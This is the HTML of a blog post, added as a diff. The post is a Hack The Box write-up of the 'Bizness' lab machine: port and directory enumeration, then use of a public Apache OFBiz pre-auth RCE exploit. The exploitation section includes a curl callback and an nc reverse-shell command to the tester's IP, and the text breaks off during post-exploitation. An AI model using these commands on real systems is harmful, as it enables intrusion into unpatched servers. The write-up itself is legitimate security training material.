@@ -1,0 +1,391 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<!-- iOS Safari -->
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- Chrome, Firefox OS and Opera Status Bar Color -->
+<meta name="theme-color" content="#FFFFFF">
+<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.11.1/katex.min.css">
+<link rel="stylesheet" type="text/css"
+  href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.19.0/themes/prism.min.css">
+<link rel="stylesheet" type="text/css" href="css/SourceSansPro.css">
+<link rel="stylesheet" type="text/css" href="css/theme.css">
+<link rel="stylesheet" type="text/css" href="css/notablog.css">
+<!-- Favicon -->
+
+  <link rel="shortcut icon" href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fe7dae887-ad1b-438b-8674-40f561aa2ea3%2Fnoun-terminal-4364895.svg?table=collection&amp;id=c08d2689-cc7d-4fc6-bbcc-bf7b8739bc9b">
+
+<style>
+  :root {
+    font-size: 20px;
+  }
+</style>
+  <title>HTB Machine — Bizness&nbsp;|&nbsp;C:\Users\ch3ng &gt;_</title>
+  <meta property="og:type" content="blog">
+  <meta property="og:title" content="HTB Machine — Bizness">
+  
+    <meta name="description" content="The name “Bizness” provided a major hint that the box is themed around Apache OFBiz, which had a critical RCE exploit published around the time of release. This is probably also the reason why the user flag got blooded in less than 2 minutes! The root part involves reversing a password hash found in a database dump.">
+    <meta property="og:description" content="The name “Bizness” provided a major hint that the box is themed around Apache OFBiz, which had a critical RCE exploit published around the time of release. This is probably also the reason why the user flag got blooded in less than 2 minutes! The root part involves reversing a password hash found in a database dump.">
+  
+  
+    <meta property="og:image" content="https://labs.hackthebox.com/storage/avatars/1919b64800f6676d0c0d285a9d664cee.png">
+  
+  <style>
+    .DateTagBar {
+      margin-top: 1.0rem;
+    }
+  </style>
+</head>
+
+<body>
+  <nav class="Navbar">
+  <a href="/">
+    <div class="Navbar__Btn">
+      
+        <span><img class="inline-img-icon" src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fe7dae887-ad1b-438b-8674-40f561aa2ea3%2Fnoun-terminal-4364895.svg?table=collection&amp;id=c08d2689-cc7d-4fc6-bbcc-bf7b8739bc9b"></span>&nbsp;
+      
+      <span>Home</span>
+    </div>
+  </a>
+  <span class="Navbar__Delim">&centerdot;</span>
+  <a href="https://github.com/ch3ng625", target="_blank">
+    <div class="Navbar__Btn">
+      <span><img class="inline-img-icon" src="icons/github.svg"></span>&nbsp;
+      <span>GitHub</span>
+    </div>
+  </a>
+  <span class="Navbar__Delim">&centerdot;</span>
+  <a href="https://au.linkedin.com/in/chengw625/", target="_blank">
+    <div class="Navbar__Btn">
+      <span><img class="inline-img-icon" src="icons/linkedin.png"></span>&nbsp;
+      <span>LinkedIn</span>
+    </div>
+  </a>
+  <span class="Navbar__Delim">&centerdot;</span>
+  <a href="https://app.hackthebox.com/profile/786447", target="_blank">
+    <div class="Navbar__Btn">
+      <span><img class="inline-img-icon" src="icons/htb.svg"></span>&nbsp;
+      <span>HackTheBox</span>
+    </div>
+  </a>
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+</nav>
+
+  <header class="Header">
+    
+    <div class="Header__Spacer Header__Spacer--NoCover">
+    </div>
+    
+      <div class="Header__Icon">
+        <span><img class="inline-img-icon" src="https://labs.hackthebox.com/storage/avatars/1919b64800f6676d0c0d285a9d664cee.png"></span>
+      </div>
+    
+    <h1 class="Header__Title">HTB Machine — Bizness</h1>
+    
+      <div class="DateTagBar">
+        
+          <span class="DateTagBar__Item DateTagBar__Date">Posted on Sun, May 26, 2024</span>
+        
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--blue">
+            <a href="tag/HTB">HTB</a>
+          </span>
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--orange">
+            <a href="tag/Linux">Linux</a>
+          </span>
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--green">
+            <a href="tag/Easy">Easy</a>
+          </span>
+        
+      </div>
+    
+  </header>
+  <article id="https://www.notion.so/0dd52a3dc0224b9bbcccdf456d148605" class="PageRoot"><h3 id="https://www.notion.so/0b316fed2a9143d08596bebd13c5f595" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/0b316fed2a9143d08596bebd13c5f595"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Summary:</span></span></h3><div id="https://www.notion.so/79e27b789f2b49849e352519ba1dfe25" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The name “Bizness” provided a major hint that the box is themed around Apache OFBiz, which had a critical RCE exploit published around the time of release. This is probably also the reason why the user flag got blooded in less than 2 minutes! The root part involves reversing a password hash found in a database dump.</span></span></p></div><div id="https://www.notion.so/cd6175086c9441418aff0c4d06e23a05" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/18504e1d6fc74f28a5717301ef31481a" class="Divider"></div><h3 id="https://www.notion.so/041bafb21e1242f38e6beaa6ad95c7eb" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/041bafb21e1242f38e6beaa6ad95c7eb"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Enumeration:</span></span></h3><div id="https://www.notion.so/8540a33bb8e0471db37c8e484fdf0e4b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Nmap:</strong></span></span></p></div><pre id="https://www.notion.so/a0b83e5dd9fe4210b823bd2222880cef" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/bizness/enumeration/nmap]
+└─$</span></mark></span><span class="SemanticString"><span> sudo nmap --min-rate 1000 -p- 10.129.8.94
+
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-31 19:51 ACDT
+Nmap scan report for 10.129.8.94
+Host is up (0.33s latency).
+Not shown: 65531 closed tcp ports (reset)
+PORT      STATE SERVICE
+22/tcp    open  ssh
+80/tcp    open  http
+443/tcp   open  https
+45693/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 88.04 seconds
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/bizness/enumeration/nmap]
+└─$</span></mark></span><span class="SemanticString"><span> sudo nmap -A -p 22,80,443,45693 10.129.8.94
+
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-31 19:53 ACDT
+Nmap scan report for 10.129.8.94
+Host is up (0.33s latency).
+
+PORT      STATE SERVICE    VERSION
+22/tcp    open  ssh        OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
+|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
+|_  256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
+80/tcp    open  http       nginx 1.18.0
+|_http-title: Did not follow redirect to https://bizness.htb/
+|_http-server-header: nginx/1.18.0
+443/tcp   open  ssl/http   nginx 1.18.0
+|_http-title: 400 The plain HTTP request was sent to HTTPS port
+| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK
+| Not valid before: 2023-12-14T20:03:40
+|_Not valid after:  2328-11-10T20:03:40
+|_http-server-header: nginx/1.18.0
+|_ssl-date: TLS randomness does not represent time
+| tls-nextprotoneg: 
+|_  http/1.1
+| tls-alpn: 
+|_  http/1.1
+45693/tcp open  tcpwrapped
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running: Linux 5.X
+OS CPE: cpe:/o:linux:linux_kernel:5.0
+OS details: Linux 5.0
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT       ADDRESS
+1   332.28 ms 10.10.14.1
+2   332.22 ms 10.129.8.94
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 41.45 seconds</span></span></span></code></pre><div id="https://www.notion.so/dd0212edd71c4c6f97742d09110cd6d0" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Nmap found 4 open ports, and port 80 redirects to HTTPS. A domain name was also identified, which I added to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/etc/hosts</code></span><span class="SemanticString">.</span></span></p></div><pre id="https://www.notion.so/9f43ab528d6a46c0b4d2a4acc3deaa73" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span># HTB machine Bizness
+10.129.8.94 bizness.htb</span></span></span></code></pre><div id="https://www.notion.so/ac8a91d421fb4d5e82f3854e93c465b7" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/34801b6a48a3478dae14120eb4868850" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">TCP443 — HTTPS:</strong></span></span></p></div><div id="https://www.notion.so/a150473b16004163b27f4a57e23a0545" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F37a755c2-2cff-4c25-beb4-e7aec64e9276%2FUntitled.png?width=1911&amp;table=block&amp;id=a150473b-1600-4163-b27f-4a57e23a0545"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F37a755c2-2cff-4c25-beb4-e7aec64e9276%2FUntitled.png?width=1911&amp;table=block&amp;id=a150473b-1600-4163-b27f-4a57e23a0545" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/f87f1d89ae194eefb1bfaf2d13d4eed2" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The site looks like a generic static page, no useful information can be found here. I ran </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">feroxbuster</code></span><span class="SemanticString"> to look for hidden directories.</span></span></p></div><pre id="https://www.notion.so/782510f086b546289065429463e57183" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/bizness/enumeration/tcp443]
+└─$</span></mark></span><span class="SemanticString"><span> feroxbuster -u https://bizness.htb -w directory-list-2.3-medium.txt -k
+
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben &quot;epi&quot; Risher 🤓                 ver: 2.10.1
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ https://bizness.htb
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.10.1
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🔎  Extract Links         │ true
+ 🏁  HTTP methods          │ [GET]
+ 🔓  Insecure              │ true
+ 🔃  Recursion Depth       │ 4
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+302      GET        0l        0w        0c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+200      GET       15l      120w     9418c https://bizness.htb/lib/lightbox/js/lightbox.min.js
+200      GET       14l      228w    20443c https://bizness.htb/lib/touchSwipe/jquery.touchSwipe.min.js
+&lt;..SNIP..&gt;
+500      GET       10l       77w     1443c https://bizness.htb/catalog/images
+[&gt;-------------------] - 43s    19587/3528798 2h      found:34      errors:222    
+🚨 Caught ctrl+c 🚨 saving scan state to ferox-https_bizness_htb-1706693333.state ...
+[&gt;-------------------] - 44s    19652/3528798 2h      found:34      errors:222    
+[&gt;-------------------] - 43s     1957/220546  45/s    https://bizness.htb/ 
+[&gt;-------------------] - 38s     1729/220546  45/s    https://bizness.htb/images/ 
+[&gt;-------------------] - 36s     1700/220546  47/s    https://bizness.htb/content/ 
+[&gt;-------------------] - 36s     1679/220546  46/s    https://bizness.htb/common/ 
+[&gt;-------------------] - 36s     1692/220546  47/s    https://bizness.htb/images/products/ 
+[&gt;-------------------] - 36s     1692/220546  47/s    https://bizness.htb/images/img/ 
+[&gt;-------------------] - 36s     1562/220546  44/s    https://bizness.htb/images/icons/ 
+[&gt;-------------------] - 35s     1555/220546  44/s    https://bizness.htb/catalog/ 
+[&gt;-------------------] - 32s     1239/220546  39/s    https://bizness.htb/marketing/ 
+[&gt;-------------------] - 29s     1016/220546  35/s    https://bizness.htb/common/css/ 
+[&gt;-------------------] - 29s      924/220546  32/s    https://bizness.htb/ecommerce/ 
+[&gt;-------------------] - 27s      890/220546  34/s    https://bizness.htb/ap/ 
+[&gt;-------------------] - 23s      748/220546  33/s    https://bizness.htb/ar/ 
+[&gt;-------------------] - 20s      599/220546  30/s    https://bizness.htb/common/js/ 
+[&gt;-------------------] - 15s      374/220546  25/s    https://bizness.htb/ebay/ 
+[&gt;-------------------] - 4s       119/220546  27/s    https://bizness.htb/common/js/plugins/ 
+&lt;..SNIP..&gt;</span></span></span></code></pre><div id="https://www.notion.so/3bda494b91864b8abed20f10b7b0d3e1" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">It found several interesting endpoints, such as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/content/</code></span><span class="SemanticString">, </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/catalog/</code></span><span class="SemanticString">, </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/marketing/</code></span><span class="SemanticString">, and </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/ecommerce/</code></span><span class="SemanticString">. Browsing to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/content/</code></span><span class="SemanticString"> redirects to an Apache OFBiz login page.</span></span></p></div><div id="https://www.notion.so/e90ea2b4b27845b9835ad881ec7a0b37" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F0a8667b5-2eb8-49b9-b2bc-bc895c9eeaa3%2FUntitled.png?width=1917&amp;table=block&amp;id=e90ea2b4-b278-45b9-835a-d881ec7a0b37"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F0a8667b5-2eb8-49b9-b2bc-bc895c9eeaa3%2FUntitled.png?width=1917&amp;table=block&amp;id=e90ea2b4-b278-45b9-835a-d881ec7a0b37" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/35dfcf7b94fc4c6c998ff1032ec6515b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The bottom right of the page also reveals the version number.</span></span></p></div><div id="https://www.notion.so/d1102609ced34566a6b9c27a82c98b60" class="Image Image--Normal"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F52d87f21-d3d0-4722-b94b-3127c1eb8a75%2FUntitled.png?width=480&amp;table=block&amp;id=d1102609-ced3-4566-a6b9-c27a82c98b60"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F52d87f21-d3d0-4722-b94b-3127c1eb8a75%2FUntitled.png?width=480&amp;table=block&amp;id=d1102609-ced3-4566-a6b9-c27a82c98b60" style="width:480px"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/d5c96750297f421aa011cc4bd4f1941d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/209b9409519b4195bf538252c42428f1" class="Divider"></div><h3 id="https://www.notion.so/88221caf4dda4cfdbab8d6e5167e65fa" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/88221caf4dda4cfdbab8d6e5167e65fa"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Exploitation:</span></span></h3><div id="https://www.notion.so/8d72395fd5d14a5f9977bd443d861a1b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">CVE-2023-49070, CVE-2023-51467: OfBiz Pre-Auth RCE</strong></span></span></p></div><div id="https://www.notion.so/55e1e882d6794d8abe6922bdb536a8cb" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Around the time this box got released (January 2024), SonicWall </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://blog.sonicwall.com/en-us/2023/12/sonicwall-discovers-critical-apache-ofbiz-zero-day-authbiz/">disclosed</a></span><span class="SemanticString"> a critical vulnerability on OFBiz that can result in remote code execution (RCE), and a quick Google search also confirmed that the current version (18.12) is affected.</span></span></p></div><div id="https://www.notion.so/1c5c5d2a9c94447a8ae8e33ad9357665" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The vulnerability stems from a no longer maintained XML RPC module, which insecurely deserializes user-provided data, as well as having an authentication bypass flaw.</span></span></p></div><div id="https://www.notion.so/822857d949714c21b94353e163fe1f4a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Conveniently, there’s a public exploit code </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass/tree/master">published</a></span><span class="SemanticString"> that’s super easy to use.</span></span></p></div><pre id="https://www.notion.so/ff0d28aa8dd6467690bfe036d9c83363" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/bizness/exploitation]
+└─$</span></mark></span><span class="SemanticString"><span> python exploit.py --url https://bizness.htb
+
+[+] Scanning started...
+[+] Apache OFBiz instance seems to be vulnerable.</span></span></span></code></pre><div id="https://www.notion.so/b07c9c98a34a43f38d68515f7e05b6fc" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">To confirm code execution, I’ll set up a local HTTP server and try to connect back from the server using </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">curl</code></span><span class="SemanticString">.</span></span></p></div><pre id="https://www.notion.so/5640714e60f449da8d9ca054e1c16df2" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/bizness/exploitation]
+└─$</span></mark></span><span class="SemanticString"><span> python exploit.py --url https://bizness.htb --cmd &#x27;curl http://10.10.14.38:8000&#x27;</span></span></span></code></pre><div id="https://www.notion.so/dde4cab1cc0545f48808ab31fe8d012d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">And a GET request was detected. We have RCE, easy as that.</span></span></p></div><pre id="https://www.notion.so/8c52819f35cc474f97e91301364440ec" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.129.8.94 - - [31/Jan/2024 21:16:41] &quot;GET / HTTP/1.1&quot; 200 -</span></span></span></code></pre><div id="https://www.notion.so/429392d2cf044a6fabb4eb1657e918c3" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/9b806bb1aa0147889f0f133b76404f90" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">After trying several different payloads, a </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">nc</code></span><span class="SemanticString"> reverse shell command worked, and a shell session was caught in the listener.</span></span></p></div><pre id="https://www.notion.so/373741fe5dad4c4b8681af6b8f97a43a" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/bizness/exploitation]
+└─$</span></mark></span><span class="SemanticString"><span> python exploit.py --url https://bizness.htb --cmd &#x27;nc 10.10.14.38 8001 -e /bin/bash&#x27;</span></span></span></code></pre><div id="https://www.notion.so/5a02d288ca754890a5b879092400c039" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><pre id="https://www.notion.so/630f914afd02480c81a4ca62477ad409" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/bizness/exploitation]
+└─$</span></mark></span><span class="SemanticString"><span> sudo nc -lvnp 8001
+
+listening on [any] 8001 ...
+connect to [10.10.14.38] from (UNKNOWN) [10.129.8.94] 53012</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>
+
+ofbiz@bizness:~$</span></mark></span><span class="SemanticString"><span> id
+
+uid=1001(ofbiz) gid=1001(ofbiz-operator) groups=1001(ofbiz-operator)</span></span></span></code></pre><div id="https://www.notion.so/d3a6d35c64074161899aa5314b89c8b8" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/ae74992036384db2bd6889d1d4dcb1e7" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">User Flag:</strong></span></span></p></div><pre id="https://www.notion.so/9ca7dd8652b741a78fb56f61016acafe" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>ofbiz@bizness:~$</span></mark></span><span class="SemanticString"><span> cat user.txt
+
+d1fd60cb************************</span></span></span></code></pre><div id="https://www.notion.so/6fac1a7fa84a49e9a06b39009607df06" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/68f634d4d5664108872dd9308c611b55" class="Divider"></div><h3 id="https://www.notion.so/25106dcf404243e081bd52ab9005b39b" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/25106dcf404243e081bd52ab9005b39b"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Post-Exploitation as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">ofbiz</code></span><span class="SemanticString">:</span></span></h3><div id="https://www.notion.so/86fd57f4e8ef40a1b4f036490de717e2" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Derby Database:</strong></span></span></p></div><div id="https://www.notion.so/945a81edd198404380588e6b57c89b02" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">After exploiting a web applications, one thing I always check for is the database, as it quite often contains password hashes for other users on the system. This time it’s a bit more tricky, as the database used is something called </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://cwiki.apache.org/confluence/display/OFBIZ/Apache+OFBiz+Technical+Production+Setup+Guide">Apache Derby</a></span><span class="SemanticString">.</span></span></p></div><div id="https://www.notion.so/d89e99c35c694a6189562be79426d135" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Derby is a portable and lightweight RDBMS implemented in Java. As such, it allows seamless integration with Java-based applications, such as OFBiz.</span></span></p></div><div id="https://www.notion.so/0a0573ea130d48389ee86bd9ef2750c7" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">According to the </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://db.apache.org/derby/docs/10.7/tools/index.html">documentation</a></span><span class="SemanticString">, it has a CLI tool called </span><span class="SemanticString"><code class="SemanticString__Fragment 